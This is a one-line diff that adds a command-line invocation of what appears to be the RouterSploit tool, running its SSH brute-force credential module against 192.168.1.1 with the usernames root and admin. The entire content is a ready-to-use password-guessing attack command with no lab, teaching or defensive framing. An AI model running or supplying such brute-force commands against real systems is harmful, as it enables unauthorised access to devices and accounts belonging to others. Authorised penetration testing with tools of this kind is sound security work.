@@ -1,0 +1,1 @@
+python3 rsf.py -m creds/generic/ssh_bruteforce -s"target 192.168.1.1" -s "usernames root,admin"
